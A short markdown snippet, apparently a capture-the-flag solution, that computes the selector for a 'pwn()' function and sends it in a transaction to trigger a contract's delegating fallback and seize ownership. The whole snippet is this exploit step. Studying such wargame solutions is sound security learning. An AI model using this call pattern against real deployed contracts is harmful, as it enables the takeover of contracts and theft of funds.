```markdown
# bytes4(keccak256(abi.encodePacked("pwn()"))) = 0xdd365b8b
await contract.sendTransaction({data:"0xdd365b8b"});

```